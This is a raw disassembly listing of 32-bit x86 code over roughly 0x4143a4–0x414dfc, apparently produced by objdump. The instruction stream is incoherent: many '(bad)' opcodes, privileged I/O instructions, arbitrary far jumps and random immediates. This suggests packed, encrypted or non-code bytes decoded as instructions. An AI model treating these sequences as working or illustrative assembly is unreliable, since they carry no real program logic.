  4143a4:	fsubr  DWORD PTR [edi+ecx*2+0x6]
  4143a8:	push   esi
  4143a9:	pop    esi
  4143aa:	ins    BYTE PTR es:[edi],dx
  4143ab:	push   ebx
  4143ac:	repnz adc esi,DWORD PTR [ebx+0x4c]
  4143b0:	das    
  4143b1:	aaa    
  4143b2:	and    DWORD PTR [ecx],edi
  4143b4:	ds loope 0x414400
  4143b7:	push   ecx
  4143b8:	pop    es
  4143b9:	nop
  4143ba:	addr16 ret 0x5bef
  4143be:	dec    esi
  4143bf:	adc    BYTE PTR fs:[eax+eax*8],ch
  4143c3:	and    BYTE PTR gs:0xa2647a1f,al
  4143ca:	iret   
  4143cb:	or     DWORD PTR ds:0xe9513eb,edi
  4143d1:	xchg   ecx,eax
  4143d2:	gs push edi
  4143d4:	(bad)  
  4143d5:	mov    esp,0x2bab7c7e
  4143da:	and    DWORD PTR [ebx],eax
  4143dc:	pop    ebp
  4143dd:	out    0xf8,al
  4143df:	sti    
  4143e0:	mov    ebx,0x4f6ae014
  4143e5:	inc    edx
  4143e6:	sub    dl,ch
  4143e8:	ret    
  4143e9:	sbb    al,0x5b
  4143eb:	inc    ecx
  4143ec:	pop    es
  4143ed:	dec    edi
  4143ee:	xor    eax,0xac1010f8
  4143f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143f4:	dec    edx
  4143f5:	or     edx,DWORD PTR [esp+ecx*4-0x5fe585e4]
  4143fc:	psrlw  mm7,0xb9
  414400:	xchg   esi,eax
  414401:	or     DWORD PTR [ebp+0x57],edx
  414404:	das    
  414405:	loop   0x414443
  414407:	mov    bl,0x73
  414409:	sub    BYTE PTR [ecx+0x3],bh
  41440c:	add    ebp,ebx
  41440e:	fst    QWORD PTR [eax-0x30]
  414411:	int    0xcb
  414413:	mov    esp,ecx
  414415:	mov    eax,ds:0x35ae3ae5
  41441a:	mov    ds:0x98ec5bb,al
  41441f:	rcr    DWORD PTR [esp+ebp*1+0x58],cl
  414423:	retf   
  414424:	cmc    
  414425:	xchg   ecx,eax
  414426:	mov    WORD PTR [ebp-0xfef14d3],es
  41442c:	aaa    
  41442d:	adc    bh,BYTE PTR [edi]
  41442f:	xor    DWORD PTR [edx],eax
  414431:	test   bl,0xcf
  414434:	fwait
  414435:	add    edx,DWORD PTR [esi-0x6de9b02]
  41443b:	fnstsw WORD PTR [ebp+0x46]
  41443e:	mov    cl,0xaf
  414440:	mov    dh,0x61
  414442:	xlat   BYTE PTR ds:[ebx]
  414443:	imul   eax,DWORD PTR [ebp+0x37],0x94082081
  41444a:	fucompp 
  41444c:	pop    ebp
  41444d:	pop    edx
  41444e:	push   edi
  41444f:	xor    ah,ah
  414451:	icebp  
  414452:	shr    al,cl
  414454:	in     eax,0x1e
  414456:	sbb    edx,esp
  414458:	dec    ebx
  414459:	push   esp
  41445a:	pop    eax
  41445b:	adc    ebp,edi
  41445d:	sbb    edx,eax
  41445f:	xchg   esp,eax
  414460:	gs and dl,ah
  414463:	xor    eax,0x75d0f8cc
  414468:	into   
  414469:	scas   eax,DWORD PTR es:[edi]
  41446a:	xchg   ebp,eax
  41446b:	push   esi
  41446c:	js     0x414437
  41446e:	xor    bh,bl
  414470:	cmp    dh,BYTE PTR [esi+0x33d65de0]
  414476:	and    esi,DWORD PTR [ebp+0x7b01e89c]
  41447c:	jmp    DWORD PTR [ecx]
  41447e:	clc    
  41447f:	add    DWORD PTR [ebx-0x13174895],ebx
  414485:	sbb    DWORD PTR [esi],ecx
  414487:	jnp    0x414500
  414489:	mov    ebx,edx
  41448b:	loope  0x414486
  41448d:	iret   
  41448e:	neg    BYTE PTR [eax+eax*1+0x0]
	...
  4144f1:	add    BYTE PTR [eax],al
  4144f3:	add    BYTE PTR [ebx+0x73],bl
  4144f6:	inc    edx
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi-0xa]
  414501:	cld    
  414502:	mov    al,ds:0xd5ec1b
  414507:	add    BYTE PTR [ecx+eax*1],al
  41450a:	add    BYTE PTR [eax],al
  41450c:	jp     0x414494
  41450e:	inc    eax
  41450f:	adc    eax,0xeec1fd81
  414514:	inc    ebx
  414515:	sar    BYTE PTR [eax-0x2b],1
  414518:	jg     0x4144eb
  41451a:	rcr    si,1
  41451d:	mov    bl,ch
  41451f:	iret   
  414520:	pusha  
  414521:	in     eax,dx
  414522:	push   ebx
  414523:	(bad)
  414528:	adc    ah,BYTE PTR [ecx-0x66]
  41452b:	jo     0x4144f2
  41452d:	dec    esp
  41452e:	push   edi
  41452f:	out    dx,eax
  414530:	sbb    bl,BYTE PTR [ebp+ecx*1+0x7fca509e]
  414537:	push   edx
  414538:	ja     0x4145b9
  41453a:	mov    ebx,eax
  41453c:	adc    edx,DWORD PTR [ebp+0x1e9d010c]
  414542:	retf   
  414543:	in     al,0x32
  414545:	lods   al,BYTE PTR ds:[esi]
  414546:	sahf   
  414547:	int3   
  414548:	sub    DWORD PTR [eax+esi*2-0x22678516],esi
  41454f:	addr16 inc edi
  414551:	jl     0x4145ac
  414553:	adc    al,0xb9
  414555:	std    
  414556:	fisttp WORD PTR [eax-0x3]
  414559:	ins    DWORD PTR es:[edi],dx
  41455a:	inc    ebp
  41455b:	and    DWORD PTR [edx],ecx
  41455d:	jg     0x414556
  41455f:	pop    ss
  414560:	pop    edx
  414561:	dec    ebx
  414562:	push   cs
  414563:	push   edi
  414564:	and    BYTE PTR ds:0xfdf7c49b,0x45
  41456b:	inc    ecx
  41456c:	mov    DWORD PTR [edi-0x44],esi
  41456f:	into   
  414570:	jae    0x41453a
  414572:	sbb    al,0xcf
  414574:	sar    BYTE PTR [edx+0x1f90e940],cl
  41457a:	stos   DWORD PTR es:[edi],eax
  41457b:	out    dx,al
  41457c:	sbb    ch,dl
  41457e:	les    ecx,FWORD PTR [ebx-0x6f]
  414581:	shl    BYTE PTR [eax+0x44],1
  414584:	js     0x4145d4
  414586:	scas   eax,DWORD PTR es:[edi]
  414587:	setno  BYTE PTR [edx+0x22]
  41458b:	push   edx
  41458c:	pop    ebp
  41458d:	hlt    
  41458e:	popf   
  41458f:	mov    eax,0xaeea42f4
  414594:	pop    esi
  414595:	fs mov eax,0xf2c9a8e5
  41459b:	or     BYTE PTR [ecx],dl
  41459d:	add    cl,BYTE PTR [edx]
  41459f:	mov    eax,0xd5f4700d
  4145a4:	pop    ebx
  4145a5:	xor    eax,0x17c6d218
  4145aa:	pop    ebx
  4145ab:	out    0x8e,eax
  4145ad:	and    DWORD PTR [edx+0x69],esi
  4145b0:	jae    0x4145ae
  4145b2:	ror    esi,cl
  4145b4:	je     0x41455a
  4145b6:	ret    
  4145b7:	aad    0xbc
  4145b9:	mov    edx,0x36c93bac
  4145be:	aaa    
  4145bf:	jp     0x4145e8
  4145c1:	cs (bad) 
  4145c4:	mov    bh,BYTE PTR [ecx+0x6bbcdcfe]
  4145ca:	inc    ebp
  4145cb:	jns    0x4145ba
  4145cd:	xchg   DWORD PTR [ebp-0x464a1259],ecx
  4145d3:	shr    ebp,cl
  4145d5:	clc    
  4145d6:	jns    0x41459b
  4145d8:	es xchg esi,eax
  4145da:	aam    0xef
  4145dc:	call   0xb356066e
  4145e1:	xor    cl,ch
  4145e3:	imul   ebx,ecx,0x9129eee
  4145e9:	inc    ebp
  4145ea:	mov    esi,0xab5055e8
  4145ef:	fdivr  QWORD PTR [ebx+edi*8]
  4145f2:	jp     0x41463b
  4145f4:	inc    ebx
  4145f5:	adc    DWORD PTR [ecx+eax*8+0x248641db],ebp
  4145fc:	out    0x1,al
  4145fe:	cmp    cl,dh
  414600:	sub    al,0x69
  414602:	cmc    
  414603:	mov    ah,0xf3
  414605:	add    DWORD PTR [ebx-0x1f],0x2ba11314
  41460c:	or     edx,esi
  41460e:	sbb    ebx,DWORD PTR [eax+0x0]
	...
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0x56
  414681:	cmp    ebx,eax
  414683:	xchg   ecx,eax
  414684:	lock (bad) 
  414686:	add    BYTE PTR [eax],al
  414688:	add    al,0x1
  41468a:	add    BYTE PTR [eax],al
  41468c:	fwait
  41468d:	xor    DWORD PTR [eax],esp
  41468f:	jnp    0x4146c9
  414691:	call   0xfd69:0xc3b2a8ca
  414698:	jno    0x4146a4
  41469a:	pusha  
  41469b:	or     al,0x58
  41469d:	dec    edi
  41469e:	and    BYTE PTR ds:[ebp+0x19],bl
  4146a2:	lahf   
  4146a3:	pop    esi
  4146a4:	xchg   ebx,eax
  4146a5:	xor    BYTE PTR [ecx+0x3e],bh
  4146a8:	sar    eax,cl
  4146aa:	or     eax,0x4cc78a4b
  4146b0:	lock icebp 
  4146b2:	mov    ch,0xe5
  4146b4:	dec    edx
  4146b5:	mov    al,ds:0x5b4af4ef
  4146ba:	mov    DWORD PTR [edx+0x35],esp
  4146bd:	and    edx,ebp
  4146bf:	sahf   
  4146c0:	sub    eax,0xecfa2855
  4146c5:	mov    ebp,0x27f9ab
  4146ca:	fadd   DWORD PTR [eax+0x6adb3469]
  4146d0:	stos   DWORD PTR es:[edi],eax
  4146d1:	cmp    bh,BYTE PTR [edi+0x79449fa4]
  4146d7:	(bad)  
  4146d9:	test   ax,0xbee9
  4146dd:	nop
  4146de:	nop
  4146df:	lods   al,BYTE PTR ds:[esi]
  4146e0:	inc    esi
  4146e1:	stos   DWORD PTR es:[edi],eax
  4146e2:	and    DWORD PTR [ecx-0x5bb91d3d],ecx
  4146e8:	dec    DWORD PTR [ebx+ebx*4-0x74]
  4146ec:	add    edx,DWORD PTR [eax]
  4146ee:	ins    DWORD PTR es:[edi],dx
  4146ef:	sub    BYTE PTR [ebx-0x49],cl
  4146f2:	in     eax,0x7f
  4146f4:	bound  edi,QWORD PTR [ecx-0xbc8c456]
  4146fa:	ret    
  4146fb:	fidivr DWORD PTR [eax+0x52]
  4146fe:	dec    edi
  4146ff:	fwait
  414700:	mov    al,0xf9
  414702:	mov    al,ds:0x2cd9b6ff
  414707:	(bad)  
  414708:	(bad)  
  414709:	jl     0x414761
  41470b:	jo     0x4146ec
  41470d:	daa    
  41470e:	outs   dx,BYTE PTR ds:[esi]
  41470f:	imul   eax,eax,0xffffff8a
  414712:	cmp    DWORD PTR [ebp+ebx*8+0x65],eax
  414716:	mov    BYTE PTR [edi+ebp*2+0x11],bl
  41471a:	imul   esp
  41471c:	xor    cl,BYTE PTR gs:[edx-0x34]
  414720:	jmp    0x3eb9:0x89f1be49
  414727:	fnstcw WORD PTR [ecx+0x6e]
  41472a:	pop    ebp
  41472b:	xchg   edi,eax
  41472c:	pop    es
  41472d:	repz xchg eax,ebp
  414730:	in     eax,0x5
  414732:	cli    
  414733:	pop    edx
  414734:	adc    DWORD PTR [ecx],edi
  414736:	inc    esp
  414737:	mov    BYTE PTR [ebp+0xcdf87b2],cl
  41473d:	or     dh,BYTE PTR [esi-0x5b8ed61c]
  414743:	or     al,0x5a
  414745:	jle    0x41477c
  414747:	and    bl,0x54
  41474a:	jmp    0x4146d2
  41474c:	inc    ecx
  41474d:	icebp  
  41474e:	(bad)
  414751:	dec    edi
  414752:	int3   
  414753:	lahf   
  414754:	imul   ebp,DWORD PTR [edx-0x474ec758],0x98fa4c48
  41475e:	jb     0x4147ad
  414760:	xchg   ecx,eax
  414761:	mov    al,0x39
  414763:	fdiv   DWORD PTR [eax-0x4f9d3f5a]
  414769:	or     DWORD PTR [ecx-0x38879e08],edx
  41476f:	xor    al,0x1e
  414771:	sub    BYTE PTR [esi+0x60],0xee
  414775:	jb     0x4147a4
  414777:	pop    esp
  414778:	out    0xf4,al
  41477a:	outs   dx,BYTE PTR ds:[esi]
  41477b:	ret    
  41477c:	jmp    0x2aad:0x1d372b4f
  414783:	dec    ebx
  414784:	jnp    0x4147cd
  414786:	jbe    0x41479a
  414788:	lahf   
  414789:	push   ebp
  41478a:	icebp  
  41478b:	inc    esp
  41478c:	aad    0x8e
  41478e:	push   esp
  41478f:	push   esi
	...
  4147f4:	jle    0x414825
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0xa4ea9710
  414804:	hlt    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    al,0x1
  41480a:	add    BYTE PTR [eax],al
  41480c:	sbb    al,0xb2
  41480e:	xchg   edx,eax
  41480f:	ror    DWORD PTR [edi],0x3f
  414812:	repz jge 0x414858
  414815:	(bad)  
  414816:	stc    
  414817:	jecxz  0x41483b
  414819:	xchg   al,dh
  41481b:	jmp    0x41486d
  41481d:	(bad)  
  41481e:	loope  0x4147d5
  414820:	daa    
  414821:	and    eax,0x603de6cf
  414826:	lea    ecx,[eax+0x41]
  414829:	lock ret 
  41482b:	push   0xec4be221
  414830:	out    0x5b,al
  414832:	jnp    0x414802
  414834:	and    DWORD PTR [ebp+0x37],esi
  414837:	jbe    0x4147d5
  414839:	push   es
  41483a:	push   0x889ed7f9
  41483f:	inc    ecx
  414840:	pop    edx
  414841:	pushf  
  414842:	mov    al,0x0
  414844:	mov    WORD PTR [edi+0x556aae44],ds
  41484a:	jae    0x414803
  41484c:	dec    esp
  41484d:	add    al,0xdf
  41484f:	fdivp  st(1),st
  414851:	js     0x414822
  414853:	mov    ch,0xaf
  414855:	sub    BYTE PTR [edi],dl
  414857:	loope  0x414891
  414859:	sbb    al,0x98
  41485b:	popf   
  41485c:	jle    0x4148ac
  41485e:	test   al,0x99
  414860:	or     al,dh
  414862:	test   al,0xaa
  414864:	jns    0x414815
  414866:	sub    dl,BYTE PTR [ecx-0x7ca15ddf]
  41486c:	sub    bh,BYTE PTR [eax-0x70f030dc]
  414872:	sbb    al,0x2c
  414874:	push   cs
  414875:	jne    0x414881
  414877:	ret    
  414878:	enter  0xaa13,0x1e
  41487c:	sub    ecx,ebp
  41487e:	adc    DWORD PTR [eax+0x1e],ecx
  414881:	push   0x8bca6599
  414886:	jge    0x414815
  414888:	sub    BYTE PTR [ebx+0xbbecc1a],bh
  41488e:	iret   
  41488f:	sub    ebp,ecx
  414891:	out    dx,eax
  414892:	sbb    al,0xe5
  414894:	inc    edx
  414895:	dec    ebx
  414896:	pop    edi
  414897:	xor    esp,DWORD PTR [esi-0x48]
  41489a:	xor    BYTE PTR [ebx+0xba90649],0xea
  4148a1:	scas   al,BYTE PTR es:[edi]
  4148a2:	or     al,0x6e
  4148a4:	jmp    0x414866
  4148a6:	js     0x414919
  4148a8:	outs   dx,BYTE PTR ds:[esi]
  4148a9:	push   ebx
  4148aa:	loopne 0x414868
  4148ac:	sar    BYTE PTR ds:0x299990fc,cl
  4148b2:	sub    DWORD PTR [eax-0x42],0xffffff9d
  4148b6:	jmp    0x4148f8
  4148b8:	pop    ax
  4148ba:	inc    esi
  4148bb:	and    al,0x85
  4148bd:	mov    eax,ds:0xf2daf2a3
  4148c2:	jmp    0x77b7f0ec
  4148c7:	dec    edi
  4148c8:	retf   
  4148c9:	push   es
  4148ca:	xchg   ch,al
  4148cc:	fs jb  0x4148c9
  4148cf:	aaa    
  4148d0:	lar    ebp,bx
  4148d3:	scas   eax,DWORD PTR es:[edi]
  4148d4:	ja     0x4148f4
  4148d6:	mov    eax,DWORD PTR [ecx-0x782a2936]
  4148dc:	dec    ebp
  4148dd:	xor    eax,0x79f0d3f8
  4148e2:	inc    eax
  4148e3:	sub    BYTE PTR [ebp-0x61a57bfb],cl
  4148e9:	int3   
  4148ea:	jb     0x41487a
  4148ec:	dec    edi
  4148ed:	repnz bswap ecx
  4148f0:	aas    
  4148f1:	mov    dh,BYTE PTR [edx-0x7bca6b6]
  4148f7:	push   esp
  4148f8:	jmp    0x3be07bba
  4148fd:	test   al,0xc7
  4148ff:	or     bl,dl
  414901:	jbe    0x4148c1
  414903:	add    dl,BYTE PTR [ebp+0x9]
  414906:	lock jmp 0x59efb37e
  41490c:	add    al,0x2e
  41490e:	aam    0xc5
	...
  414974:	or     edi,DWORD PTR [esi-0x2e]
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	fld    QWORD PTR [edx+edi*8-0x12]
  414984:	clc    
  414985:	fadd   DWORD PTR [eax]
  414987:	add    BYTE PTR [ecx+eax*1],al
  41498a:	add    BYTE PTR [eax],al
  41498c:	push   edx
  41498d:	(bad)  
  41498e:	(bad)  
  41498f:	or     bl,cl
  414991:	rol    ecx,0x52
  414994:	ins    DWORD PTR es:[edi],dx
  414995:	dec    esp
  414996:	inc    edx
  414997:	xchg   ebp,eax
  414998:	jae    0x41497d
  41499a:	and    BYTE PTR [esi-0x35c7b72d],bh
  4149a0:	cmp    edx,DWORD PTR [esi]
  4149a2:	xchg   esp,eax
  4149a3:	pop    edx
  4149a4:	add    eax,0x3acff17e
  4149a9:	(bad)  
  4149aa:	iret   
  4149ab:	mov    edi,0x3034b300
  4149b0:	inc    edx
  4149b1:	sub    eax,0x382b60da
  4149b6:	scas   al,BYTE PTR es:[edi]
  4149b7:	fs dec esp
  4149b9:	mov    al,0xb9
  4149bb:	jnp    0x414971
  4149bd:	dec    ebp
  4149be:	and    al,0xcf
  4149c0:	adc    al,0x22
  4149c2:	pop    ebp
  4149c3:	pushf  
  4149c4:	and    BYTE PTR [ecx-0x7],dl
  4149c7:	fwait
  4149c8:	xchg   edx,eax
  4149c9:	les    ebx,FWORD PTR [eax]
  4149cb:	mov    ah,0xc6
  4149cd:	push   edx
  4149ce:	adc    eax,0x52ab9b4d
  4149d3:	(bad)  
  4149d4:	push   esp
  4149d5:	cmp    DWORD PTR [edx+0x54],eax
  4149d8:	mov    ds:0x2d07b25e,eax
  4149dd:	push   edi
  4149de:	fdiv   QWORD PTR [ebx+0x5031b883]
  4149e4:	or     eax,0xdbeabffb
  4149e9:	xchg   esp,eax
  4149ea:	adc    esp,DWORD PTR [ebx]
  4149ec:	fs jne 0x414a39
  4149ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149f0:	dec    ebp
  4149f1:	fisub  DWORD PTR [eax]
  4149f3:	lea    ecx,[edi-0x43]
  4149f6:	or     edi,DWORD PTR [ecx]
  4149f8:	nop
  4149f9:	and    DWORD PTR [ebx+0x26ba90ec],ebp
  4149ff:	xchg   edx,eax
  414a00:	add    bh,BYTE PTR [ebx+0x11327835]
  414a06:	mov    bh,cl
  414a08:	lds    ebx,FWORD PTR [ebx-0x45]
  414a0b:	adc    eax,0x66c1cca3
  414a10:	adc    al,BYTE PTR [eax+0x5]
  414a13:	aad    0xb6
  414a15:	repnz inc edx
  414a17:	jge    0x414a11
  414a19:	in     eax,dx
  414a1a:	mov    cl,0x5b
  414a1c:	pop    ds
  414a1d:	aas    
  414a1e:	mov    dl,0x2f
  414a20:	lods   al,BYTE PTR ds:[esi]
  414a21:	cmp    DWORD PTR ds:0x163385bf,0x1a6850dc
  414a2b:	(bad)  
  414a2c:	mov    bh,0x73
  414a2e:	fbstp  TBYTE PTR [eax-0x139733a0]
  414a34:	inc    esp
  414a35:	mov    eax,0x759bcbaa
  414a3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a3b:	daa    
  414a3c:	pop    ecx
  414a3d:	mov    eax,ds:0x22a887c3
  414a42:	jp     0x414a9f
  414a44:	das    
  414a45:	aam    0xef
  414a47:	(bad)  
  414a48:	and    ebp,ebx
  414a4a:	ss jg  0x414ab6
  414a4d:	xchg   esp,eax
  414a4e:	test   al,0xe1
  414a50:	int3   
  414a51:	fstp   DWORD PTR [ebp+0x17a7fc56]
  414a57:	hlt    
  414a58:	ds mov dh,al
  414a5b:	ins    DWORD PTR es:[edi],dx
  414a5c:	popa   
  414a5d:	jecxz  0x414a6a
  414a5f:	shr    BYTE PTR [esi-0x3a],1
  414a62:	ret    
  414a63:	outs   dx,BYTE PTR ds:[esi]
  414a64:	rcr    DWORD PTR [eax+0x1300913b],1
  414a6a:	or     BYTE PTR [esi],0xc
  414a6d:	std    
  414a6e:	in     eax,dx
  414a6f:	ins    DWORD PTR es:[edi],dx
  414a70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a71:	sbb    DWORD PTR [esi],0x62
  414a74:	(bad)  
  414a75:	scas   al,BYTE PTR es:[edi]
  414a76:	jmp    0x730:0xe0965946
  414a7d:	loop   0x414abf
  414a7f:	nop
  414a80:	call   0x44f8c985
  414a85:	mov    WORD PTR [edi-0x662fda36],es
  414a8b:	pop    ebx
  414a8c:	stos   BYTE PTR es:[edi],al
  414a8d:	out    dx,eax
  414a8e:	cwde   
  414a8f:	pop    esi
	...
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx-0x7f709c27]
  414b02:	sbb    eax,0xd9fc3e
  414b07:	add    BYTE PTR [ecx+eax*1],al
  414b0a:	add    BYTE PTR [eax],al
  414b0c:	sbb    eax,0xc701dbc7
  414b11:	fnsave [edx+edi*4]
  414b14:	pop    ss
  414b15:	stc    
  414b16:	int3   
  414b17:	dec    ebx
  414b18:	xchg   edi,eax
  414b19:	push   ds
  414b1a:	dec    BYTE PTR [esi]
  414b1c:	pusha  
  414b1d:	xchg   edx,eax
  414b1e:	inc    esp
  414b1f:	or     DWORD PTR [edi],ebx
  414b21:	loop   0x414af1
  414b23:	mov    ds:0xe339075e,eax
  414b28:	push   es
  414b29:	aam    0xf7
  414b2b:	arpl   ax,dx
  414b2d:	inc    eax
  414b2e:	mov    ecx,0xfdd9ac33
  414b33:	mov    BYTE PTR [esi-0x1f4f1e08],cl
  414b39:	and    al,0x3b
  414b3b:	iret   
  414b3c:	mov    esi,0x6cae0fc
  414b41:	sti    
  414b42:	inc    esp
  414b43:	xchg   ecx,eax
  414b44:	int    0x20
  414b46:	mov    esi,0xbc53ed69
  414b4b:	sbb    DWORD PTR [eax+0x4fb887ca],edi
  414b51:	inc    esi
  414b52:	mov    cs,WORD PTR [ebx]
  414b54:	add    eax,0x53655c89
  414b59:	iret   
  414b5a:	sbb    cl,BYTE PTR [ebx]
  414b5c:	and    eax,0xb8c16792
  414b61:	mov    ecx,0x1f0f98d4
  414b66:	mov    esp,0x6836638e
  414b6b:	xor    ch,cl
  414b6d:	push   cs
  414b6e:	stos   BYTE PTR es:[edi],al
  414b6f:	mov    dh,0xb2
  414b71:	push   ecx
  414b72:	cmp    BYTE PTR es:[ebx],dl
  414b75:	push   ebx
  414b76:	push   ecx
  414b77:	add    BYTE PTR [edx+0x74c7a3a2],cl
  414b7d:	push   edx
  414b7e:	pop    ds
  414b7f:	popa   
  414b80:	rcr    bh,0x7
  414b83:	popf   
  414b84:	cmp    eax,0x99ad27c
  414b89:	js     0x414c09
  414b8b:	push   eax
  414b8c:	or     DWORD PTR [esi+0xec64ea],esp
  414b92:	or     al,0xfc
  414b94:	out    0xde,eax
  414b96:	dec    edi
  414b97:	repz xor BYTE PTR [esi-0x30],al
  414b9b:	adc    DWORD PTR [ebx-0xc29e121],ebp
  414ba1:	pop    esp
  414ba2:	out    dx,al
  414ba3:	repnz sti 
  414ba5:	mov    eax,0xde68bf5e
  414baa:	mov    ch,0x8
  414bac:	jge    0x414c00
  414bae:	mov    dl,0x19
  414bb0:	mov    ecx,esi
  414bb2:	mul    BYTE PTR [ebp+ecx*2+0x5b]
  414bb6:	pop    ss
  414bb7:	sub    eax,0xfd4307e2
  414bbc:	ins    DWORD PTR es:[edi],dx
  414bbd:	and    BYTE PTR [esi+edx*8+0x33],bl
  414bc1:	pop    ecx
  414bc2:	rcpps  xmm2,XMMWORD PTR [eax+ecx*2+0x112767cd]
  414bca:	push   cs
  414bcb:	sbb    al,0x98
  414bcd:	nop
  414bce:	sub    BYTE PTR [eax],ah
  414bd0:	test   al,0xf7
  414bd2:	dec    ecx
  414bd3:	lock pop es
  414bd5:	call   0x9798163b
  414bda:	repz addr16 ret 0xd5b5
  414bdf:	(bad)  
  414be1:	inc    esp
  414be2:	mov    ebx,0xa1c63b30
  414be7:	pusha  
  414be8:	push   0xed9ddd02
  414bed:	sub    bl,BYTE PTR [ecx+0x2a]
  414bf0:	xchg   ebp,eax
  414bf1:	fisttp WORD PTR [ebp-0x76ad8f36]
  414bf7:	jnp    0x414c61
  414bf9:	fs nop
  414bfb:	pop    edi
  414bfc:	stos   DWORD PTR es:[edi],eax
  414bfd:	adc    BYTE PTR [eax],dl
  414bff:	repz inc eax
  414c01:	mov    ecx,0x27e6c5bc
  414c06:	imul   edx,DWORD PTR [edx+ecx*2+0x5875ccdd],0x29
  414c0e:	xchg   edx,eax
  414c0f:	pop    ss
	...
  414c74:	xor    al,0x64
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	cs adc ebp,edi
  414c81:	push   DWORD PTR [ebx+0x57]
  414c84:	add    bl,bl
  414c86:	add    BYTE PTR [eax],al
  414c88:	add    al,0x1
  414c8a:	add    BYTE PTR [eax],al
  414c8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c8d:	adc    BYTE PTR [esi-0x7501a33b],0x8f
  414c94:	dec    esp
  414c95:	dec    edx
  414c96:	stos   DWORD PTR es:[edi],eax
  414c97:	jbe    0x414cf4
  414c99:	mov    ds:0x82aed9b4,eax
  414c9e:	or     BYTE PTR [edi+edx*8],ah
  414ca1:	inc    ebp
  414ca2:	ds sub edx,ebx
  414ca5:	inc    eax
  414ca6:	mov    esi,0x4adac4a6
  414cab:	push   cs
  414cac:	nop
  414cad:	adc    al,0x49
  414caf:	pushf  
  414cb0:	test   BYTE PTR [eax],ah
  414cb2:	mov    WORD PTR [ebx+edi*8],es
  414cb5:	repz jmp 0x56a1:0xd49d433c
  414cbd:	enter  0x9e0b,0x79
  414cc1:	mov    dl,BYTE PTR [esi-0x766d8898]
  414cc7:	lea    eax,[ecx-0x65]
  414cca:	ins    DWORD PTR es:[edi],dx
  414ccb:	(bad)  
  414ccc:	jmp    0xe562837c
  414cd1:	les    edi,FWORD PTR [eax]
  414cd3:	xchg   esp,eax
  414cd4:	call   0x3b86c1e4
  414cd9:	xor    eax,DWORD PTR [ebp+0x76]
  414cdc:	xchg   edi,eax
  414cdd:	test   BYTE PTR [ecx-0x14],bh
  414ce0:	popf   
  414ce1:	jno    0x414cc3
  414ce3:	shl    DWORD PTR es:[ecx],0x9
  414ce7:	jnp    0x414cff
  414ce9:	or     BYTE PTR [edx-0xb06cd3],0x63
  414cf0:	adc    esi,ebx
  414cf2:	mov    esp,0xad874be9
  414cf7:	add    DWORD PTR [ebx-0x57983838],ebx
  414cfd:	pop    es
  414cfe:	aaa    
  414cff:	(bad)  
  414d00:	loopne 0x414c8f
  414d02:	loop   0x414c92
  414d04:	les    ecx,FWORD PTR [ebx-0x5f1c5b8c]
  414d0a:	pop    ecx
  414d0b:	jae    0x414cde
  414d0d:	sub    eax,0x72e94ef9
  414d12:	dec    eax
  414d13:	retf   
  414d14:	fstp   st(7)
  414d16:	lahf   
  414d17:	dec    eax
  414d18:	ret    0xec8f
  414d1b:	xor    eax,0x80e43744
  414d20:	dec    ebp
  414d21:	out    dx,al
  414d22:	mov    dl,0x5e
  414d24:	dec    eax
  414d25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d26:	in     al,dx
  414d27:	cdq    
  414d28:	push   edi
  414d29:	cmp    DWORD PTR [eax-0x32],ebx
  414d2c:	jg     0x414d41
  414d2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d30:	mov    ebp,0xd64ee353
  414d35:	sub    esp,DWORD PTR [esi+0x12]
  414d38:	inc    eax
  414d39:	cmp    ecx,eax
  414d3b:	mov    esp,0x884aebf2
  414d40:	jmp    0xedf3:0x2768fb71
  414d47:	push   ebx
  414d48:	loopne 0x414d8f
  414d4a:	add    al,0x71
  414d4c:	dec    esi
  414d4d:	sbb    DWORD PTR [edx+edx*1],0xb875beee
  414d54:	sbb    al,0x14
  414d56:	shl    BYTE PTR [ebp-0xf2a0ee0],1
  414d5c:	cmp    DWORD PTR [edx+0x3a1e15a9],ebx
  414d62:	mov    dh,0x38
  414d64:	cmp    DWORD PTR ds:0x527ec5a9,edi
  414d6a:	push   esp
  414d6b:	jge    0x414d45
  414d6d:	sti    
  414d6e:	clc    
  414d6f:	inc    ebp
  414d70:	pop    es
  414d71:	sbb    eax,0x4998b535
  414d76:	xchg   esi,eax
  414d77:	push   esi
  414d78:	xor    al,ch
  414d7a:	xchg   ecx,eax
  414d7b:	sub    al,0x14
  414d7d:	inc    esp
  414d7e:	(bad)  
  414d7f:	adc    al,0xb0
  414d81:	cs in  eax,0x91
  414d84:	push   cs
  414d85:	adc    ecx,DWORD PTR [ecx]
  414d87:	pop    ss
  414d88:	inc    esi
  414d89:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d8b:	xor    al,0x1e
  414d8d:	shl    DWORD PTR [eax+0xcc],cl
	...
  414df3:	add    BYTE PTR [edi+0x3e911299],dh
  414df9:	fwait
  414dfa:	mov    bh,0xbf
  414dfc:	in     al,dx
